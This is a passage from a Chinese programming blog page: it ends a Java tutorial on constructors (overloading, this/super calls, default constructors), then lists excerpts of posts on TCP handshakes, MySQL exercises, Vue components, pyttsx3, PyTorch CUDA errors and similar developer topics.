说完了构造方法的特点，我们再来说说构造方法的作用。很多教科书上都把构造方法的作用说成是为了创建一个对象，其实这种理解是有问题的。必须承认，我们创建一个类的对象必须要调用构造方法，但构造方法的作用其实并不是为了创建对象，而是为了“初始化对象的内部状态”。“初始化对象的内部状态”这句话听起来不太好理解，其实就是为了给对象的各个属性赋初始值。我们来看一个例子：
我们定义了一个Person类，并且给Person类定义了两个属性，分别是String类型的name和int类型的age，并且还定义了一个printInfo()方法，用来打印这两个属性的值。接下来我们在main方法中创建两个Person类对象
执行程序的结果如下图：
我们发现，这两个对象的name属性和age属性的值都是默认的那个初始值，这种初始值其实没有太大意义。如果我们希望在创建对象的时候给就对象的两个属性赋上有意义的值，此时我们就可以把给属性赋值的语句写到构造方法当中。
有了构造方法之后，我们再次执行main方法，得到的结果是这样的
从运行结果上来看，两个对象的属性都被赋予了有意义的值。但是问题来了：按照这样的写法，我们所创建的每个Person对象，name属性都被赋值为“张三”，而age属性都被赋值为20。这说明我们创建的对象是“千篇一律”的，并且从情理上也说不通，毕竟每个人都有属于自己的名字和年龄，不可能每个人都叫张三年龄20岁。
那么，如何在创建对象的时候，为每个对象都初始化属于自己的真实数据呢？这时候，我们就要用有参数的构造方法来搞定这个问题了。我们可以给构造方法添加两个参数，通过参数把数据传递给对象的属性。
当我们给构造方法添加了两个参数之后，却发现main方法中原来本来正确的代码出现了语法错误
这是为什么呢？就是因为我们给Person类的构造方法添加了参数，现在Person类当中已经没有无参数的构造方法了，既然Person类当中已经没有了无参数的构造方法，那么我们在main方法中调用Person类无参数的构造方法，肯定会报错。
有人会问：编译器不是会“免费赠送”给每个类一个无参数的构造方法吗？那个送来的构造方法哪去了？这里需要特别说明一下：编译器“赠送”给类无参数构造方法是有条件的，这个条件就是：程序员没有为类定义构造方法。也就是说：只有程序员没有为类添加构造方法的情况下，编译器才会在编译的时候给这个类去自动添加一个无参数的构造方法，现在，程序员已经给Person类定义了构造方法，那么编译器就不会再给这个类添加构造方法了。
好，回归正题，现在我们想修改这个语法错误很简单，只要在main方法中给Person类的构造方法传递适当的参数就可以了
给构造方法传递了参数之后，语法错误自然消失。再次运行程序，会得到这样的结果
大家可以看到，这一次，我们就能够按照我们的意愿，创建出有自己个性化的对象了。通过这个例子我们可以看出：构造方法的作用是给对象的各个属性赋上合理的初始值，从而使得我们所创建的对象不再是“千篇一律”，而是“千姿百态”。
那么，现在我们可以再来思考两个问题：第一个问题：构造方法可以像普通方法那样实现重载吗？这是完全没有问题的，我们可以在一个类中定义多个构造方法，只要这些构造方法参数不同，就构成了重载。第二个问题：在一个构造方法中，可以调用另外一个构造方法吗？也没有问题，但调用的时候，需要注意：不能像调用普通方法那样，通过类名去调用，而是需要用一个关键字this。但是这种调用也有两个条件：
一、调用构造构造方法的语句必须放在第一行。
二、两个构造方法不能形成相互调用关系。为了方便表述，我们把一个类中的两个构造方法代称为X和Y。如果我们在X中调用了Y，那么就不能在Y中去调用X了。否则就会形成循环依赖关系，我们来看下面的例子。
我们在一个构造方法中调用了另一个构造方法，调用的时候，需要用到this关键字，并且把调用语句写到第一行，这样才能顺利通过编译。
以上我们讲解的都是关于构造方法的基本常识，在这个讲解的过程中，并没有设计到类的继承关系。如果涉及继承关系，构造方法在定义和调用的过程中也有一些必须了解的知识点。
首先必须清楚，如果我们创建的是一个子类的对象，那么在创建这个子类对象的时候，虚拟机会先调用父类的构造方法，之后才去调用子类的构造方法。这个顺序不能错，否则会出现语法错误。为了说明问题：我们先来给Person类添加一个无参数的构造方法，并在构造方法中输出一句”父类的构造方法”
之后我们再定义出一个Person类的子类Student，并且在子类中也定义一个无参数的构造方法，在构造方法中输出一句”子类的构造方法“
之后，我们在main方法中创建一个子类对象。
运行main方法，得到结果如下图：
很多人不明白，在子类的构造方法中，只是输出了“子类的构造方法”这样一句话，控制台上为什么同时还输出了“父类的构造方法”？原因就是我们刚才所说的：调用子类构造方法的时候，会首先调用父类的构造方法。即使程序员没有写代码去调用父类的构造方法，编译器也会把调用父类构造方法的语句补充添加到代码中。
那么，补充添加调用父类构造方法的代码，是如何实现的？这里必须先讲一下子类调用父类构造方法的语法细节：
一、子类调用父类构造方法的时候，不能通过构造方法本身的名称来调用，必须使用super关键字。
二、子类在它的普通方法中不能调用父类的构造方法，只能在它自身的构造方法中才能调用。
三、子类调用父类构造方法的语句，必须写在自身构造方法的第一行。
这三条语法规则至关重要，请牢记。按照这个语法规则，编译器看到程序员没有在子类构造方法中调用父类构造方法，会按下图所示的方式把调用父类构造方法的语句添加到代码中
通过上图可以看到，如果程序员没有在子类构造方法中添加调用父类构造方法的语句，编译器会自动把那条调用语句补充进来，并且放到子类构造方法的第一行。在文章一开始提出了一个问题：编译器会在赠送给我们的构造方法中添加什么内容，此时你应该明白了吧？就是因为在子类的构造方法中调用了父类的构造方法，所以我们才会在控制台上会看到两条输出语句。
现在又冒出一个问题：父类如果有好几个构造方法，编译器会自动调用哪一个呢？这里必须明确：编译器只会调用那个无参数的构造方法，不会调用有参数的构造方法。这个规则又会引发一个新的问题，那就是：如果父类中压根就没有无参数的构造方法，那怎么办？在这种情况下，编译器就会强制子类定义一个构造方法，并且在它的构造方法中，通过手动调用的形式去调用父类的构造方法，如果你不那么干，编译器就会使出它的杀手锏：划红线！来看下图：
既然无论程序员是否愿意，子类在它的构造方法当中必须要调用父类的构造方法，那么，通常情况下我们应该怎样调用父类构造方法才算合理呢？一般来讲，子类都会比父类拥有更多的属性。就本文而言，父类(Person)有2个属性，分别是name和age，而子类(Student)有3个属性，分别是name、age和num。当然，子类的3个属性当中，有2个是从父类那里继承过来的。在创建一个Student对象的时候，必须对这3个属性进行初始化。所以通常子类的构造方法会定义3个参数，这3个参数分别用来初始化子类的3个属性。既然子类的3个属性当中，有2个是继承于父类的，那么就可以用父类的构造方法去初始化那2个继承来的属性，而剩下的那个由子类自身所定义的属性num，可以在子类自身构造方法中实现初始化，看下图
通常来讲，子类就是这样调用父类构造方法的。
最后再回答一个问题：普通方法的名称可以与类名相同吗？答案是：可以！在这种情况下，编译器区分该方法是普通方法还是构造方法，就看方法的前面有没有声明返回值类型。这就是为什么Java语言规定构造方法不能有声明返回值类型的原因。
希望通过阅读本文，能让你理解构造方法的意义和用法！
本专栏每篇文章讲解一个知识点，如果想系统学习Java编程可以点击这里观看我在本站的视频课程，也可以订阅我的免费专栏《Java从小白到高手》。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/39f5cecac5165369edfbab8d8d07139a/" rel="bookmark">
			Ubuntu下pyttsx3实现中文文字转语音的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		要想实现语音合成功能，我们可以选择:
1. 各大人工智能平台的api接口2. python深度学习自己训练模型3. 调用第三方库 本文简述pyttsx3的使用方法及代码实例。 本文简述pyttsx3的使用方法及代码实例.
安装 笔者使用清华镜像源，用pip命令快速安装
pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pyttsx3
pip3 install -i https://pypi.tuna.tsinghua.edu.cn/simple pyttsx3
代码实现 import pyttsx3 import io import sys engine = pyttsx3.init() # 获取语音包 voices = engine.getProperty('voices') for voice in voices: print ('id = {}\tname = {} \n'.format(voice.id, voice.name)) # 设置使用的语音包 engine.setProperty('voice', 'zh') #开启支持中文 # engine.setProperty('voice', voices[0].id) # 改变语速 范围为0-200 默认值为200 rate = engine.getProperty('rate') #获取当前语速 engine.setProperty('rate', rate-40) # 设置音量 范围为0.0-1.0 默认值为1.0 engine.setProperty('volume', 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/39f5cecac5165369edfbab8d8d07139a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/979cd4ee56e014f1f4db44f469107c83/" rel="bookmark">
			TCP为什么是三次握手和四次挥手以及可能出现的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 TCP为啥设定为三次握手(两个角度分析)不可靠产生无效链接浪费服务器资源 TCP为啥四次挥手服务端有剩余数据需要发送--四次挥手(多数情况)服务端无剩余数据发送--捎带应答--四次变三次(少数情况) 四次挥手可能出现的问题可能出现大量的TIME_WAIT可能出现大量的CLOSE_WAIT TCP为啥设定为三次握手(两个角度分析) 如果是4次，多了一次没啥意义还慢了，如果是两次握手逻辑可能存在下列问题：
(这两个方面也可以理解为握手过程中可能出现的问题)
不可靠 TCP协议是可靠的，那么建立的连接也需要确保是双向，可靠的; 根据连接过程分析，只有一方收到了另一方的ack确认报文，才能证明那一方的接收功能都正常。
举下面这个确认序号的例子说明 完整的接，收能力的重要性:
(这个抽象的接收功能，在下图握手过程中实际交换seq初始序号的过程中能体现)
第二次握手时，s端发完ack报文就默认进入establish建立成功状态，假设这个ack报文半路丢了呢？
c端压根就没有拿到ack也没有拿到s端的初始序号，显然这个链接是不可靠的！无法完成后续数据的交互；
产生无效链接浪费服务器资源 假定C端向S端发送了一个请求，但是该请求因为网络原因，在网路中逗留了一会儿，未及时送达。此时C将再次向S发送请求，Server接收到请求，发送确认包，完成连接并开始进行数据传输，直到数据传输完成后，断开连接。
之后，之前逗留的链接到了S端，这就尴尬了，S拿到syn请求，并回应了ACK应答，然后进入establish建立完成状态，这个链接无疑是不合法的，c端早已离去，剩下这个空连接，维持他消耗着S端的资源;
(c端:s端一般是n:1,如果存在上述问题，试想大量空连接有可能被维护，服务器资源会越来越吃紧从而导致更严重的问题)
TCP为啥四次挥手 客户端或服务器均可主动发起挥手动作,调用close()即可，为了方便理解，假设C端先发起，S端作为被动断开的一方;
其实我们三次握手的过程中的第二次，是将四次挥手中的中间两次合并优化了，那为啥TCP是四次挥手?其实这个说法有歧义，因为TCP多数情况下是4次挥手，但是也存在3次挥手的情况：
服务端有剩余数据需要发送–四次挥手(多数情况) 因为多数情况下，当c端主动与s端断开之后，s端不一定立即就与c端断开连接，可能还会有一些数据要发给c端，所以还会保持链接一段时间;
（当然TCP有保活机制，会通过设定时间间隔反复发送活性探测数据包，如果一段时间内没有响应或者一定的次数之后，就会断开这个链接释放资源）
服务端无剩余数据发送–捎带应答–四次变三次(少数情况) 在少数情况下，c端主动断开，s端恰巧也没啥要发的，也需要立即断开，那么TCP的捎带应答机制，就将四次挥手的中间两次进行合并，这时候四次挥手就变成了三次挥手;
四次挥手可能出现的问题 客户端或服务器均可主动发起挥手动作,调用close()即可，为了方便理解，假设C端先发起，S端作为被动断开的一方;
可能出现大量的TIME_WAIT TIME_WAIT状态是C端收到了S端主动发送fin请求后，向S端发回了ACK确认断开报文之后出现的，需要保持2*MSL时间确保最后一个ACK报文能够到达S端，双方正常关闭; (设计成2*MSL的原因是确保响应ACK的传输时间和如果这个ACK丢失，S端重新发送FIN请求断开的时间)可见，msl一定是大于超时重传的时间的;
解决:
一台主机出现大量的TIME_WAIT证明这台主机上发起大量的主动关闭连接(常见于一些爬虫服务器)
这时候我们应该调整TIME_WAIT的等待时间（linux centos当时测试默认是60s），或者开启套接字地址重用选项
(否则这个端口号就被占用了，这个主机其他的服务就用不了这个端口号了…Bind Error)
可能出现大量的CLOSE_WAIT CLOSE_WAIT是S端同意C端的fin请求之后进入的状态，等待上层程序进一步处理（比如发送剩余数据）;
解决:
如果S端产生大量的CLOSE_WAIT，可能是内核断开连接后，S端忘记调用close，这就是我们程序员的疏忽了，写了个小bug;
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/19d89cc5611281f29182870a1db7cc07/" rel="bookmark">
			Mac下关闭8080端口的应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 sudo lsof -i:8080 #得到进程号之后，结束该进程 sudo kill -9 xxxxx 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/98745934d07a280cbf8885c82028cf6d/" rel="bookmark">
			MySQL(六)之MySQL经典练习题及答案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目转自他人，答案结合他人和自己的想法
目录
练习开始
查询学过1和2课程的学生
查询学过1课程但没学过2课程的学生
查询学过1课程但学过2课程的学生
查询平均成绩大于等于 60 分的同学的学生编号和学生姓名和平均成绩
查询在 SC 表存在成绩的学生信息
查询所有同学的学生编号、学生姓名、选课总数、所有课程的总成绩
查询所有同学的学生编号、学生姓名、选课总数、所有课程的总成绩
查询「李」姓老师的数量
查询学过「张三」老师授课的同学的信息
查询没学过"张三"老师讲授的任一门课程的学生姓名
查询没有学全所有课程的同学的信息
查询至少有一门课与学号为" 1 "的同学所学相同的同学的信息
查询和" 1 "号的同学学习的课程 完全相同的其他同学的信息
查询两门及其以上不及格课程的同学的学号，姓名及其平均成绩
检索" 1 "课程分数小于 60，按分数降序排列的学生信息
按平均成绩从高到低显示所有学生的所有课程的成绩以及平均成绩
查询各科成绩最高分、最低分和平均分：
查询男生、女生人数
查询名字中含有「风」字的学生信息
查询每门课程的平均成绩
查询平均成绩大于等于 85 的所有学生的学号、姓名和平均成绩
查询课程名称为「数学」，且分数低于 60 的学生姓名和分数
查询任何一门课程成绩在70分以上的姓名、课程名称和分数
查询有不及格的课程的学生信息
查询课程编号为'1'且课程成绩在80分以上的学生的学号和姓名
求每门课程的学生人数
查询选修"张三"老师所授课程的学生中，成绩最高的学生信息及其成绩
查询每门课程成绩最好的前两名，按照课程名升序，按照成绩升序
检索至少选修两门课程的学生姓名和选修课程个数
查询选修了全部课程的学生信息
查询各学生的年龄
统计每门课程的学生选修人数
查询本月过生日的学生
查询下月过生日的学生
查询本周过生日的学生
查询下周过生日的学生
建表
-- 创建学生基础信息表 create table Student ( id varchar(4) comment '学号', name varchar(10) comment '姓名', age datetime comment '年龄', sex char(1) comment '性别' ) comment '学生基础信息表'; -- 创建课程表 create table Course ( id varchar(4) comment '课程编号', name varchar(20) not null comment '课程名', T_id varchar(10) comment '代课老师' ) comment '课程表信息'; -- 创建教师信息表 create table Teacher ( id varchar(10) comment '工号', name varchar(10) comment '姓名' ); -- 创建学生和教师的中间表以及对应成绩 create table SC ( s_id varchar(4) comment '学生学号', c_id varchar(4) comment '教师工号', score decimal(18,1) ) comment '成绩表'; 插入数据
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/98745934d07a280cbf8885c82028cf6d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b13d62cdc69a052905366387afd3c11e/" rel="bookmark">
			基于java的实验室预约系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		《ssh实验室预约系统》该项目采用技术：
后台：spring+springmvc+hibernate
前台Jquery+JSP+My97DatePicker+css+js
使用了Mysql+Tomcat等相关技术
项目含有源码、文档、配套开发软件、软件安装教程、项目发布教程等
本系统的用户可以分为三种：管理员、教师、学生。以下针对三种用户分别描述其功能。
1.管理员功能描述
1） 登录：管理员在登录界面输入自己的账号密码后，即可登录系统进行相关的操作。
2） 管理用户：管理员可以管理用户信息。查看用户、删除用户。
3） 重置密码
4） 发布公告：发布重要通知,用户登录系统之后即可看到公告列表。
5） 管理实验室：管理员可以管理实验室信息。新增、修改、删除（包括名称、地点、设备台数(即总人数)等）。
备注：由于显示默认的排期表需要，id为1的实验室永久不可删除。
（6） 查看实验室预约情况：管理员可以查看所有预约信息 如实验室是否被预约，预约时间，预约人数等。
（7） 高级搜索：管理员输入搜索关键字（如=预约区间，预约用户），即可查看详细的预约情况。
（8） 查看排期表：选择某个实验室，可以查看其未来15天每天仍可被预约的人数。
（9） 退出登录
2.教师功能需求描述
（1） 登录：教师在初始界面输入职工号，密码，即可登录预约系统进行后续操作
（2） 重置密码
（3） 查看公告：登陆成功后在系统主界面可以查看管理员发布的所有公告，公告列按照创建时间倒序排列。
（4） 查看个人信息：教师可以查看个人信息（用户名、学院、专业等）
（5） 查看实验室列表：教师可以查看实验室的详细信息
（
6） 预约：分为个人预约和课堂预约。
个人预约：教师选择实验室，选择日期，选择时间区间，选择人数即可。此时最多可以预约10个位置,且该实验室剩余的位置还可以被其他学生预约,但是不能被课堂预约。
课堂预约：教师选择预约日期段，选择每周几，选择预约时间段、指定课堂、输入相应的描述信息即可完成预约。此时无论实验室是否被预约满，该时间段都不可以被再预约。
（7） 查看排期表：选择某个实验室，可以查看其未来15天每天仍可被预约的人数。
（8） 高级搜索：教师输入搜索关键字（如预约区间，选择预约类别，选择课堂），即可查看详细的预约情况。
（9） 管理预约信息：教师可以查看自己预约的信息、可取消预约 前提是预约日期是当天之后。 注：已经超出预约时间的预约信息不能删除
（10） 管理课堂信息：教师可以新增、修改、删除课堂信息。 注：该课堂若已经存在，不可再次添加。
（11） 退出登录
3.学生功能需求描述
（1） 登录
（2） 重置密码：当学生忘记密码或者想要重置密码，可以重置自己的密码。
（3） 查看公告：登陆成功后在系统主界面可以查看管理员发布的所有公告，公告列按照创建时间倒序排列。
（4） 查看个人信息：学生可以查看个人信息（用户名、学院、专业等）
（5） 查看实验室列表：学生可以查看实验室的详细信息
（6） 预约：默认是个人预约，学生不能进行课堂预约 个人预约：学生选择实验室，选择日期，时间区间，选择人数即可。此时最多可以预约10个位置,且该实验室剩余的位置还可以被其他学生预约,但是不能被课堂预约。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b13d62cdc69a052905366387afd3c11e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/39250821eed6b3280703b7a8dfc4bb08/" rel="bookmark">
			Vue组件化、插槽（Vue全局组件和局部组件定义、创建组件和注册组件，组件中使用methods和data，component、keep-alive标签、父子组件的数据与方法传递和多级传递bus通信）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
Vue组件化
Vue全局组件
创建全局组件
注册全局组件
Vue局部组件
解决template下编写HTML代码没有提示问题
组件中使用methods
组件中使用data
component标签
切换组件动画
keep-alive标签
slot标签
匿名插槽
具名插槽
v-slot:(#)
作用域插槽
v-slot:(#)补充
父子组件
父子组件数据传递和多级传递
父子组件方法传递和多级传递
$event
父子组件数据传递和多级传递补充
任意组件之间数据传递补充：bus通信
组件渲染方式
方式一
方式二（render）
Vue-CLI（Command Line Interface）
Vue组件化 需要先创建组件构造器，然后注册已经创建好的组件，最后才能使用。使用时直接使用注册的组件名称，例如下面中可以直接使用&lt;name&gt;&lt;/name&gt;，网页渲染时便会使用template中的HTML代码替换name标签。
Vue全局组件 创建全局组件 通过var Compo=Vue.extend({template:'&lt;div&gt;&lt;/div&gt;'})创建全局组件，template：后直接跟组件的HTML代码即可。注意template中只能有一个根元素，多个元素只会显示一条。
注册全局组件 通过Vue.component('name',Compo)注册已经创建好的组件，第一个参数为指定已经创建好的名称，第二个参数为已经创建好的组件构造器。注意第二个参数还可以为一个对象obj，系统会调用Vue.extend(obj)，将返回结果再传入其中（Vue.component('name',{template:&lt;div&gt;&lt;/div&gt;})可以将创建和注册全局组件变成一步）。注意如果在注册的命名时使用了驼峰命名，那么使用组件时需要将大写变为小写字母并且在之前加上-，例如Vue.component('myName',Compo)，使用时为&lt;my-name&gt;&lt;/my-name&gt;，还需注意注册名不能与HTML已有标签重名。
Vue局部组件 不需要注册，直接在实例中的component属性中定义即可，例如new Vue（{el:'#app',data:{},components:{'name':{template:'&lt;div&gt;&lt;/div&gt;'}}})，局部组件和全局组件重名时只有局部组件生效。
解决template下编写HTML代码没有提示问题 在新建的script标签中添加type和id属性，例如：&lt;script id= 'info' type='text/html'&gt;&lt;/script&gt;，并在此标签中编写HTML代码，这样会有提示，最后在注册时的template中写上template:'#info'即可。使用Vue提供的template标签并给其添加id，其它同上。 组件中使用methods 组件中只能使用组件中定义的methods而不是Vue实例中的methods，即需要给Vue.extend中传入的对象添加methods属性，在methods指向的对象中定义方法，这些方法才能在组件中使用，例如{template:'&lt;div&gt;&lt;/div&gt;',methods:{fun(){}}}，这样便可已在在该组件中使用fun函数（可以在template中使用），局部组件也是同理，在methods中使用this加属性名的方法拿到的数据是组件中定义的data函数返回对象的数据。
组件中使用data 组件中同样也只能使用组件中定义的data而不是Vue实例中的data，和methods不同的是，组件中定义的data需要是一个函数，该函数返回的对象可以理解为data，例如{template:'&lt;div&gt;&lt;/div&gt;',data(){return {abc:123}}}，在template中便可以用插值语法{{abc}}来显示123。这样的好处是复用多个组件时，每个组件都会运行一遍data函数，并将其与当前组件绑定起来，使每个组件的数据相互独立，避免了多个组件公有一份数据。
component标签 用于切换组件，该标签上有is属性，我们通过v-bind：给is属性绑定不同的属性名，便会将该标签替换为属性名对应相同的组件名的标签（也可以使用v-if和v-else实现替换组件功能）。
切换组件动画 在Vue中通过transition标签包裹component标签进行切换组件的动画，这时现有组件消失和新组件的进入动画是同时进行的，要想改变进行的次序，则在transition标签上添加mode属性，分别可以取'in-out'和'out-in'两值，'in-out'代表新元素先进行过度，完成之后当前元素离开，另一个相反。
keep-alive标签 用于在切换组件的之前缓存数据，当切换回来时候，还会有相同的数据。使用方法：将该标签包裹component标签即可。示例：比如component切换的组件中有复选框，切换前选中了，如果切换后再次切换回来，加了该标签后仍然会显示勾选状态。
slot标签 匿名插槽 用于在组件标签中动态添加内容（默认是不能添加的）。通过将slot标签写入组件的template中，此时我们使用该组件，如果在组件标签中添加了内容，那么该内容将会替换template中的slot标签全部内容，如果没有添加内容，那么会显示slot中的内容。注意当template中的slot标签有多个时，会将在组件标签中的全部内容内容复制多份分别替换。
具名插槽 用于当有多个slot标签时，在组件标签中动态添加内容时能替换指定的slot标签。当slot标签上添加了name属性时便为具名插槽（例如name='one'），这时组件标签中动态添加的内容便不会替换该slot标签，要想替换该内容需要在组件标签添加的元素中加入slot属性等于相应的名称（例如v-slot:one便会替换name='one'的slot标签），那么该内容才会去替换（不会叠加，指定多条slot='name'，这些内容将全部替换）。
v-slot:(#) 用于解决具名插槽中多个元素需要给每个元素添加slot（slot='one'）属性。该指令必须搭配template标签，在template标签上添加属性v-slot:one，这样便会将template中的内容替换slot标签中name='one'的标签。v-slot:可以简写为#。
作用域插槽 用于解决父组件标签中填充内容无法使用子组件的数据问题。通过在子组件内部的slot标签上添加属性例如v-bind:son='sondata'，其中sondata为子组件中的数据，son为传递的数据名，在父组件的标签中的template标签上添加属性slot-scope='abc'，便可以在template标签下使用{{abc.son}}，代替sondata数据。
v-slot:(#)补充 v-slot:也可以解决父组件标签中填充内容无法使用子组件的数据问题。例如通过v-slot:default='abc'（匿名插槽时default可以省略即v-slot=），表示接收匿名插槽传递的数据，如果插槽有name='one'属性，则将default替换为one即可，同上便可以在template标签下使用{{abc.son}}。
注意可以解构赋默认值例如：v-slot={son:child='process'}和slot-scope={son:child='process'}都表示将组件slot上绑定的son属性解构为变量名child，且child不存在赋值为字符串'process'。例如下面当子组件中的sondata没有值或值为undefined时，父组件中插槽的child为'process'，否则为子组件中的sondata的值。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/39250821eed6b3280703b7a8dfc4bb08/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2de095f3f032cdeba23d095ea22cdcc0/" rel="bookmark">
			一行代码解决PyTorch训练模型时突然出现的For debugging consider passing CUDA_LAUNCH_BLOCKING=1报错
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、问题描述 今天在调试模型的代码，然后代码一直运行得好好地，就突然出现了一下的错误：
RuntimeError: CUDA error: invalid device ordinal
CUDA kernel errors might be asynchronously reported at some other API call,so the stacktrace below might be incorrect.
For debugging consider passing CUDA_LAUNCH_BLOCKING=1.
觉得十分诡异，前面运行的时候没出现这个Error，但是后面点击运行的时候就出现了，而且多次点击运行，都会报的这个错。
上面的错误大概就是说我的CUDA设备序号出错。例如，训练模型的机器上只有4张显卡，那么CUDA设备序号分别是0、1、2、3。当你在程序中使用4、5或者更加大的数字时，这个错误信息就会自动地报出来。
令我觉得诡异的地方是，在我运行模型的机器中，明明有4个可以使用的CUDA设备，也就是拥有4张显卡，而我不能使用1、2、3对应的CUDA设备，然后就报了上面的这个错误。所以我觉得十分奇怪。
二、解决方法 首先，我观察了我设置程序使用CUDA设备的代码：
os.environ['CUDA_VISIBLE_DEVICES'] = '%d' % m_gpu torch.cuda.set_device(m_gpu) torch.cuda.is_available() torch.cuda.current_device() 其中上边的m_gpu是设置CUDA设备序号的变量。
然后我发现在设置CUDA设备序号时，如果调用了下面的代码，就不会出现上门的报错信息：
torch.cuda.device_count() 最终，设置CUDA设备序号的代码改为：
torch.cuda.device_count() os.environ['CUDA_VISIBLE_DEVICES'] = '%d' % m_gpu torch.cuda.set_device(m_gpu) torch.cuda.is_available() torch.cuda.current_device() 这样就解决了我上面所遇到的问题。
三、设备信息 NVIDIA驱动：NVIDIA-SMI 515.65.01 Driver Version: 515.65.01 CUDA Version: 11.7
Python版本：Python 3.6.9
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2de095f3f032cdeba23d095ea22cdcc0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/893c370ded49be4f0a1752c1bb69f481/" rel="bookmark">
			SQL Server 动态行转列（参数化表名、分组列、行转列字段、字段值）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、 构造测试数据 --创建测试表 IF EXISTS (SELECT * FROM sys.objects WHERE object_id = OBJECT_ID(N'[dbo].[TestRows2Columns]') AND type in (N'U')) DROP TABLE [dbo].[TestRows2Columns] GO CREATE TABLE [dbo].[TestRows2Columns]( [Id] [int] IDENTITY(1,1) NOT NULL, [UserName] [nvarchar](50) NULL, [Subject] [nvarchar](50) NULL, [Source] [numeric](18, 0) NULL ) ON [PRIMARY] GO --插入测试数据 INSERT INTO [TestRows2Columns] ([UserName],[Subject],[Source]) SELECT N'张三',N'语文',60 UNION ALL SELECT N'李四',N'数学',70 UNION ALL SELECT N'王五',N'英语',80 UNION ALL SELECT N'王五',N'数学',75 UNION ALL SELECT N'王五',N'语文',57 UNION ALL SELECT N'李四',N'语文',80 UNION ALL SELECT N'张三',N'英语',100 GO SELECT * FROM [TestRows2Columns]; 二、 静态实现行转列 --1：静态拼接行转列 SELECT [UserName], SUM(CASE [Subject] WHEN '数学' THEN [Source] ELSE 0 END) AS '[数学]', SUM(CASE [Subject] WHEN '英语' THEN [Source] ELSE 0 END) AS '[英语]', SUM(CASE [Subject] WHEN '语文' THEN [Source] ELSE 0 END) AS '[语文]' FROM [TestRows2Columns] GROUP BY [UserName]; 三、 动态实现行转列 这是使用拼接SQL的方式实现的，所以它适用于SQL Server 2000以上的数据库版本。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/893c370ded49be4f0a1752c1bb69f481/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0e6558787a01cc7d43f67dab04a75883/" rel="bookmark">
			Vue 实现Ctrl &#43; S / C / V
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		mounted() { window.addEventListener('keydown', this.handleEvent) }, beforeDestroy() { window.removeEventListener('keydown', this.handleEvent) // 在页面销毁的时候记得解除 }, methods: { async handleEvent(event) { switch (event.keyCode) { case 37: console.log('ctrl + ←') break case 38: console.log('ctrl + ↑') break case 39: console.log('ctrl + →') break case 40: console.log('ctrl + ↓') break case 67: console.log('ctrl + c') break case 83: console.log('ctrl + s') event.preventDefault() event.returnValue = false // 阻止直接保存网页 // eslint-disable-next-line no-prototype-builtins if (event.ctrlKey &amp;&amp; event.code === 'KeyS' &amp;&amp; store.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0e6558787a01cc7d43f67dab04a75883/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f78463848b0914959f78c67a673884d6/" rel="bookmark">
			基于MMdet的Cascade MASKRCNN 原理及源码解读
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、原理
二、源码解读
1、总参数文件configs/cascade_rcnn/cascade_mask_rcnn_r50_fpn_1x_coco.py
2、模型配置字典../_base_/models/cascade_mask_rcnn_r50_fpn.py
3、基于检测器类搭建模型 CascadeRCNN
4、backbone（ResNet） 5、neck（FPN）
6、rpn_head（RPNHead）
7、roi_head（CascadeRoIHead）
一、原理 《Cascade R-CNN: High Quality Object Detection and Instance Segmentation》
这篇文章提出了一种级联结构来改善检测及分割的效果（约有2-4的ap提升），虽然是 2018 年提出来的，但2021年做表格解析调研的时候，很多网络都用到了cascade的思想，可见确实有效。在目标检测领域，有两阶段及单阶段两种体系。Cascade就是在第二阶段级联多个分类回归步骤，将1+1的stage 修改为1+3的stage，通过proposals重采样的机制，逐步提高IOU阈值。前面stage可以生成更适合后面stage的proposals，逐步提高检测质量。如果在1+1的stage中直接提高阈值一，训练时后续步骤的输入质量更高，但positive数量减少且加重了不匹配问题，最终导致过拟合。
引用一个他人的评论：Detection其实并不是一个很合适的分类问题，没有一个明确的离散的正负样本的定义，而是通过IoU来连续定义的。但是IoU这个指标很难通过gradient descent来优化，虽然之前也有一些IoU loss的工作，但是效果并不理想。Cascade RCNN便是一个在这个方向上很好的尝试。
cascade模式下
1）在同一级中，阈值越高，输出box质量越高，但数量会变少。如图d，直接提高阈值会使表现变差
